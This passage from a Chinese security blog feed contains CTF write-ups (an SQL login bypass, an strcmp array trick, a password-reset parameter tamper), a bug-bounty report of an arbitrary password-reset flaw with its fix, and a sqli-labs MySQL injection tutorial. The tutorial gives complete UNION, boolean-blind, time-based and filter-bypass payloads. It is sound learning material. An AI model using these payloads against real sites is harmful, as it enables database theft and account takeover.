class="line"><span class="keyword">if</span>(<span class="variable">$query</span>[user]==<span class="string">"admin"</span>) &#123;</span><br><span class="line">      <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Logged in! flag:******************** &lt;/p&gt;"</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>用户名为admin即可拿到flag所以应该注释掉后面的密码 sql语句源码里都有了构造一下 <code>admin&#39;)#</code> 这里做题的时候忽略了php的基础一直这样子写<code>admin&quot;&#39;)#</code>后面才反应过来双引号是接受变量用的。。。</p><p><img src="https://i.loli.net/2019/04/01/5ca1f5c2ef58d.png" alt="QQ20190401-192734@2x.png"></p><p><code>nctf{ni_ye_hui_sql?}</code></p><h2 id="pass-check"><a href="#pass-check" class="headerlink" title="pass check"></a>pass check</h2><p>题目代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pass=@$_POST[<span class="string">'pass'</span>];</span><br><span class="line">$pass1=***********;<span class="comment">//被隐藏起来的密码</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($pass))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>(@!strcmp($pass,$pass1))&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"flag:nctf&#123;*&#125;"</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"the pass is wrong!"</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"please input pass!"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>post接收pass参数用strcmp函数与pass1做比较</p><p>php的strcmp函数不能处理数组所以</p><p><img src="https://i.loli.net/2019/04/01/5ca20c67d8ceb.png" alt="QQ20190401-210430@2x.png"></p><p><code>nctf{strcmp_is_n0t_3afe}</code></p><h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><p><img src="https://i.loli.net/2019/04/01/5ca2100b8b669.png" alt="屏幕快照 2019-04-01 下午9.19.49.png"></p><p>打开解题连接后观察url <code>user1=Y3RmdXNlcg==</code>猜测base64加密 解密后果然是<code>ctfuser</code></p><p>根据题目提示：重置管理员账号：admin 的密码</p><p>admin经过base64加密后<code>YWRtaW4=</code></p><p>url替换成<code>user1=YWRtaW4=</code></p><p>账号替换成admin</p><p><img src="https://i.loli.net/2019/04/01/5ca2147843d68.jpg" alt="Xnip2019-04-01_21-38-30.jpg"></p><p>发现替换不了账号 审查元素看一下</p><p>readonly 属性规定输入字段为只读。是不可以修改的 删除了就好</p><p><img src="https://i.loli.net/2019/04/01/5ca21531f180e.jpg" alt="Xnip2019-04-01_21-41-57.jpg"></p><p><code>nctf{reset_password_often_have_vuln}</code></p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>记第一次漏洞挖掘</title>
      <link href="/2019/04/01/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/"/>
      <url>/2019/04/01/%E8%AE%B0%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%BC%8F%E6%B4%9E%E6%8C%96%E6%8E%98/</url>
      <content type="html"><![CDATA[<p>第一次挖src 以前我很不自信 对于专属src想的都是 大厂的漏洞能有几个 就算有，好挖的也都被挖没了 不好挖的更是轮不到我这菜鸡。。</p><p><img src="https://i.loli.net/2019/04/01/5ca1a1a50d9d3.png" alt="屏幕快照 2019-04-01 下午1.28.42.png"></p><a id="more"></a><h2 id="第一次挖src"><a href="#第一次挖src" class="headerlink" title="第一次挖src"></a>第一次挖src</h2><p>前几天学校有新生来考试放假了几天。闲的无聊随便点了一个专属src就发现了一个密码重置漏洞 自己都没想到好激动！！！</p><p>任意密码重置属于高危漏洞吧</p><p>第一次挖到高危也算是开门红哈</p><p>记录一下过程</p><h2 id="挖洞过程"><a href="#挖洞过程" class="headerlink" title="挖洞过程"></a>挖洞过程</h2><p>找回密码处</p><p><img src="https://i.loli.net/2019/04/01/5ca1a323cc5a6.png" alt="QQ20190401-133517@2x.png"></p><p>填写注册时候的手机号</p><p>确定后到达第二步验证身份</p><p><img src="https://i.loli.net/2019/04/01/5ca1a44102d15.png" alt="QQ20190401-133957@2x.png"></p><p>发现有三个参数<code>number</code> <code>mobileNum</code> <code>key</code></p><p>这里187是我的手机号 发送验证码之后进入第三部密码重置</p><p><img src="https://i.loli.net/2019/04/01/5ca1a5a4b5972.png" alt="QQ20190401-134604@2x.png"></p><p><img src="https://i.loli.net/2019/04/01/5ca1a5f508fb5.png" alt="QQ20190401-134723@2x.png"></p><p>第三部发现少了 <code>number</code>参数 只有两个 参数</p><p>到达第三步密码重置的时候我把<code>mobileNum</code> <code>key</code>换成其他132…..手机号和对应的key(第一步填写账号填写对方手机号到达第二步就会得到对应手机号的key)</p><p>之后填写新密码发现果然改了132…..的密码 因此确定任意密码重置漏洞。</p><p>知道对方手机号就可以重置对方密码。</p><h2 id="简要描述"><a href="#简要描述" class="headerlink" title="简要描述"></a>简要描述</h2><p>简单说是输入手机号和验证码进行重置密码的时候，仅对验证码是否正确进行了判断，未对该验证码是否与手机号匹配做验证。</p><h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>修复方案:验证码与手机号匹配做验证。</p>]]></content>
      
      <categories>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> src </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>基于注入天书的mysql注入总结</title>
      <link href="/2019/03/10/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/"/>
      <url>/2019/03/10/%E5%9F%BA%E4%BA%8E%E6%B3%A8%E5%85%A5%E5%A4%A9%E4%B9%A6%E7%9A%84mysql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<p><img src="https://i.loli.net/2019/03/10/5c84cc486773d.jpg" alt="1.jpg"></p><p>本篇基于注入天书的例子进行总结</p><p>前几天无聊看到学校群里的新生曾讨论过sql注入 突然想到自己对sql注入的理解也是比较浅的层面 所以才想总结一下 注入较杂 较乱 水平有限不足之处还望师傅们指点。</p><a id="more"></a><h2 id="MySql系统函数"><a href="#MySql系统函数" class="headerlink" title="MySql系统函数"></a>MySql系统函数</h2><p>注入前我们先了解一下mysql常用的系统函数 这些函数往往起到 信息收集的目的</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">ersion</span><span class="params">()</span></span>            MySQL版本</span><br><span class="line"><span class="function"><span class="title">user</span><span class="params">()</span></span>               数据库用户名</span><br><span class="line"><span class="function"><span class="title">database</span><span class="params">()</span></span>           数据库名</span><br><span class="line">@@datadir            数据库路径</span><br><span class="line">@@version_compile_os 操作系统版本</span><br></pre></td></tr></table></figure><h2 id="基本的联合注入"><a href="#基本的联合注入" class="headerlink" title="基本的联合注入"></a>基本的联合注入</h2><p>information_schema这张数据表保存了MySQL服务器所有数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。</p><p>再简单点，这台MySQL服务器上，到底有哪些数据库、各个数据库有哪些表，每张表的字段类型是什么，各个数据库要什么权限才能访问，等等信息都保存在information_schema表里面。</p><p>这里拿sqli第一关来进行实验</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span>localhost<span class="regexp">/sqli-labs/</span>Less-<span class="number">1</span><span class="regexp">/?id=1'</span></span><br></pre></td></tr></table></figure><p>我们看一下源码里的查询语句 前面单引号我们应该闭合 后面我们可以用–+来注释<br><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http</span>://localhost/sqli-labs/Less-1/?id=1<span class="number">%27</span>order<span class="number">%20</span>by<span class="number">%203</span>--+</span><br></pre></td></tr></table></figure></p><p>接下里思路就比较常规了</p><h3 id="查询所有数据库"><a href="#查询所有数据库" class="headerlink" title="查询所有数据库"></a>查询所有数据库</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="symbol">%27</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,group_concat(schema_name),<span class="number">3</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.schemata--+</span><br></pre></td></tr></table></figure><h3 id="查询当前数据库"><a href="#查询当前数据库" class="headerlink" title="查询当前数据库"></a>查询当前数据库</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,database(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><h3 id="查询数据库下的表名"><a href="#查询数据库下的表名" class="headerlink" title="查询数据库下的表名"></a>查询数据库下的表名</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,group_concat(table_name),<span class="number">3</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=<span class="symbol">%22</span>security<span class="symbol">%22</span>--+</span><br></pre></td></tr></table></figure><h3 id="爆user表下的列"><a href="#爆user表下的列" class="headerlink" title="爆user表下的列"></a>爆user表下的列</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,group_concat(column_name),<span class="number">3</span><span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=<span class="symbol">%22</span>security<span class="symbol">%22</span><span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name=<span class="symbol">%22</span>users<span class="symbol">%22</span>--+</span><br></pre></td></tr></table></figure><h3 id="爆数据"><a href="#爆数据" class="headerlink" title="爆数据"></a>爆数据</h3><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/Less<span class="number">-1</span>/?id=<span class="number">-1</span><span class="symbol">%27</span><span class="symbol">%20</span>union<span class="symbol">%20</span><span class="keyword">select</span><span class="symbol">%201</span>,group_concat(id,username,password),<span class="number">3</span><span class="symbol">%20</span>from<span class="symbol">%20</span>users--+</span><br></pre></td></tr></table></figure><p>Less 1-4都是可以用类似的payload来注出数据的</p><p>唯一不同的是 </p><p>less2对没有对参数进行处理payload 与 less1 中一直，只需要将 less1 中的 ‘ 去掉即可。</p><p>less3对参数进行了’ ‘ （ ）的包装 只需要将 less1 中的 ‘ 添加） 即 ’) 即可</p><p>less4对参数进行了” “（ ）的包装 只需要将 less1 中的 ‘ 改为  “) 即可</p><h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><p>盲注是在sql语句执行后 数据不能返回到前端页面 不能回显</p><p>此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><p>注入天书上讲盲注也分为三类</p><ul><li>基于布尔的sql盲注</li><li>基于时间的sql盲注</li><li>基于报错的sql盲注</li></ul><h3 id="截取字符串常用函数"><a href="#截取字符串常用函数" class="headerlink" title="截取字符串常用函数"></a>截取字符串常用函数</h3><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">count</span><span class="params">()</span></span> 计算总数</span><br></pre></td></tr></table></figure><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">mid</span>(coulumn_name,<span class="built_in">start</span>,<span class="built_in">length</span>)</span><br></pre></td></tr></table></figure><p>​    mid(database(),1,1)&gt;’a’,查看数据库名第一位，</p><p>​    mid(database(),2,1)查看数据库名第二位，依次查看各位字符。</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Substr</span><span class="params">(a,b,c)</span></span>参数同mid函数一样</span><br></pre></td></tr></table></figure><p>​    从 b 位置开始，截取字符串 a 的 c 长度。</p><p>​    substr(database()1,1)</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">Left</span><span class="params">()</span></span>得到字符串左部指定个数的字符</span><br></pre></td></tr></table></figure><p>​    Left ( a, b )        从左侧截取a的前b位。</p><p>​    left(database(),1)&gt;’a’,查看数据库名第一位，left(database(),2)&gt;’ab’,查看数据库    名前二位</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ascii(substr((select table_name information_schema.tables where tables_schema</span><br><span class="line">=database()limit <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span> --+ //substr()函数，ascii()函数</span><br></pre></td></tr></table></figure><p>截取当前数据库下所有表名的 第一个表的 名字的第一位是否为ascii编码101(ascii编码101为字母e 也就是第一位是否为e)</p><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><p>sqli第五关来做实例</p><p>与联合查询有所不同联合查询上来就可以database爆出数据库名</p><p>盲注的话我们应该先猜数据库长度</p><h4 id="数据库的长度"><a href="#数据库的长度" class="headerlink" title="数据库的长度"></a>数据库的长度</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span>%<span class="number">27</span><span class="keyword">and</span>%<span class="number">20</span><span class="built_in">length</span>(database())=<span class="number">8</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>上面长度为8时界面Ture说明数据库长度为8</p><p>有了长度以后才应该去猜数据库名</p><h4 id="数据库名"><a href="#数据库名" class="headerlink" title="数据库名"></a>数据库名</h4><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span>%<span class="number">27</span><span class="keyword">and</span>%<span class="number">20</span>ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断数据库名的第一位是否等于s(这里把s进行了ascii码转换可以更快且更方便的猜出数据)</p><p>以此类推来猜测数据库名第二位</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">http</span>://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span>%<span class="number">27</span><span class="keyword">and</span>%<span class="number">20</span>ascii(substr(database(),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">101</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>感觉太磨叽 额。。。依次类推猜出数据库名为<code>security</code></p><h4 id="表名"><a href="#表名" class="headerlink" title="表名"></a>表名</h4><p>获取表名之前 首先应该知道数据库下表的数量 方便后面来猜表名</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>count(table_name)from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database())=<span class="number">4</span>--+</span><br></pre></td></tr></table></figure><p>当前数据库下的表的个数有4个</p><p>步骤应该很清晰</p><p>知道了有4个表接下来 我们来猜一下每个表的长度</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>length(table_name)from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%200</span>,<span class="number">1</span>)=<span class="number">6</span>--+</span><br></pre></td></tr></table></figure><p>等于6时返回正常可知第一个表长度为6</p><p>这里可以看到我们上述的语句中使用的 limit 0,1. 意思就是从第 0 个开始，获取第一个。那<br>要获取第二个是不是就是 limit 1,1！</p><p>所以获取第二个表的长度为</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>length(table_name)from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%201</span>,<span class="number">1</span>)=<span class="number">8</span>--+</span><br></pre></td></tr></table></figure><p>第三个，四个类似</p><p>至此可以获取四个表每个表的长度</p><p>接下来猜第一个表名的第一个字符</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>ascii(substr((<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%200</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>--+</span><br></pre></td></tr></table></figure><p>第一个表第二个字符</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>ascii(substr((<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%200</span>,<span class="number">1</span>),<span class="number">2</span>,<span class="number">1</span>))=<span class="number">109</span>--+</span><br></pre></td></tr></table></figure><p>上面提到了<code>limit</code> 所以猜测第二个表的第一个字符的话</p><p><code>limit 1,1</code></p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>ascii(substr((<span class="keyword">select</span><span class="symbol">%20</span>table_name<span class="symbol">%20</span>from<span class="symbol">%20</span>information_schema.tables<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()limit<span class="symbol">%201</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">114</span>--+</span><br></pre></td></tr></table></figure><p>后面依次类推</p><p>到这里我们就获取到了<code>security</code>数据库下 也就是当前数据库下的所有表名</p><p><img src="https://i.loli.net/2019/03/11/5c864d60e0dd5.png" alt="屏幕快照 2019-03-11 下午7.58.11.png"></p><h4 id="列名"><a href="#列名" class="headerlink" title="列名"></a>列名</h4><p>来看users表下的列</p><p>首先还是和表类似猜测users表下列的个数</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>count(column_name)from<span class="symbol">%20</span>information_schema.columns<span class="symbol">%20</span>where<span class="symbol">%20</span>table_schema=database()<span class="symbol">%20</span><span class="keyword">and</span><span class="symbol">%20</span>table_name=<span class="symbol">%22</span>users<span class="symbol">%22</span>)=<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p>等于3返回正常判断出有三列</p><p>套路是一样的还是判断</p><p>第一个列的长度</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less<span class="number">-5</span>/?id=<span class="number">1</span><span class="symbol">%27</span><span class="keyword">and</span><span class="symbol">%20</span>(<span class="keyword">select</span><span class="symbol">%20</span>length(column_name)from<span class="symbol">%20</span>information_schema.columns where table_schema=database() <span class="keyword">and</span> table_name=<span class="string">"users"</span> limit<span class="symbol">%200</span>,<span class="number">1</span>)=<span class="number">2</span>--+</span><br></pre></td></tr></table></figure><p>第二个三个同上面表明一样 <code>limit 1,1</code> <code>limit 2,1</code>即可</p><p>第一个列的第一个字符</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema=<span class="keyword">database</span>() <span class="keyword">and</span> table_name=<span class="string">"users"</span><span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>后面就不多写了 都是一样的东西（懒得写）</p><p>后可得 <code>users</code>表下的列</p><ul><li>id</li><li>username</li><li>password</li></ul><h4 id="数据"><a href="#数据" class="headerlink" title="数据"></a>数据</h4><p>得到列首先判断users表中有多少条记录</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> <span class="keyword">users</span>)=<span class="number">13</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>判断出users表里13条数据信息</p><p>下图 是users表下的内容 </p><p>对比笔记看起来更直观吧</p><p><img src="https://i.loli.net/2019/03/11/5c8648ace9cdf.png" alt="屏幕快照 2019-03-11 下午7.37.59.png"></p><p>紧着着判断 13条数据第一条数据的长度</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and (<span class="keyword">select</span> <span class="keyword">length</span>(username) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and (<span class="keyword">select</span> <span class="keyword">length</span>(<span class="keyword">password</span>) <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>)=<span class="number">4</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>后面还是依次类推</p><p>这样就获取到了13条数据的长度</p><p>累死了。。。。</p><p>最后就是猜数据里的内容了</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs/less-5/?id=1'and ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span> <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>第一条username列下的数据</p><p>不说了还是重复造轮子 到这里就能猜出了</p><p>13条数据的所有内容喽。。。</p><h3 id="延时注入"><a href="#延时注入" class="headerlink" title="延时注入"></a>延时注入</h3><p>延时注入 和布尔注入感觉差别并不大 但是为什么还要学 延时注入</p><p>这是因为某些注入点 你输入什么它返回的都是一样的东西 和程序员写的源码有关</p><p>这时候布尔注入算是废了 转用延时注入 语法上差别是不大的 </p><p>if(条件判断,True,False)</p><p>Sleep(5)表示延时五秒</p><p>当前数据库长度</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less-<span class="number">5</span>/?id=<span class="number">1</span><span class="symbol">'and</span> sleep(<span class="keyword">if</span>(length(database())=<span class="number">8</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>这里没有延时 可以确定当前数据库长度为8</p><p>数据库的第一位</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span>.<span class="number">0.1</span>/sqli-labs/less-<span class="number">5</span>/?id=<span class="number">1</span><span class="symbol">'and</span> sleep(<span class="keyword">if</span>(ascii(substr(database(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">115</span>,<span class="number">0</span>,<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><p>感觉和布尔的区别 就是加上了sleep if</p><p>后面的话就不重复造轮子了 同理！！！</p><p><img src="https://i.loli.net/2019/03/13/5c88d78808b5a.gif" alt="8B753C84DCF432C1F37BA72A650E89B2.gif"></p><h2 id="过滤注入关键词"><a href="#过滤注入关键词" class="headerlink" title="过滤注入关键词"></a>过滤注入关键词</h2><h3 id="过滤了and-or"><a href="#过滤了and-or" class="headerlink" title="过滤了and or"></a>过滤了and or</h3><p>绕过思路</p><ol><li>大小写变形 OR,Or oR</li><li>编码 ，hex ,url</li><li>添加注释/<em> or </em>/</li><li>利用符号and=&amp;&amp; or=||</li></ol><p>注入天书 25题 虽过滤了 or 可用此方法绕过</p><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqli-labs/less-<span class="number">25</span>/?id=<span class="number">1</span>' ||<span class="keyword">or</span> extractvalue(<span class="number">1</span>,concat(<span class="number">0</span>x7e,database()))<span class="comment">--+</span></span><br></pre></td></tr></table></figure><h3 id="过滤了空格"><a href="#过滤了空格" class="headerlink" title="过滤了空格"></a>过滤了空格</h3><p>mysql空白字符</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">%</span><span class="number">20</span> <span class="meta">%</span><span class="number">09</span> <span class="meta">%</span><span class="number">0</span>a <span class="meta">%</span><span class="number">0</span>b <span class="meta">%</span><span class="number">0</span>c <span class="meta">%</span><span class="number">0</span>d <span class="meta">%</span>a<span class="number">0</span> <span class="comment">/**/</span> tab</span><br></pre></td></tr></table></figure><p>%a0 和%0b比较常用</p><p>%0b相当于tab键</p><p>书上写到 在win下测试是不能解析%a0的 我在mac下测试把%a0解析成了问号？？？%0b也无法解析 其他的还没有去试过</p><p>猜测部分字符只能在linux环境下</p><p>这里参考以前一个ctf  <a href="https://scholar10.github.io/2018/11/26/%E8%AE%B0%E8%A2%AB%E5%A4%A7%E4%BD%AC%E4%BB%AC%E5%B8%A6%E9%A3%9E%E7%9A%84%E4%B8%80%E6%AC%A1NCTF/" target="_blank" rel="noopener">滴！晨跑打卡</a></p><h3 id="过滤union-select"><a href="#过滤union-select" class="headerlink" title="过滤union select"></a>过滤union 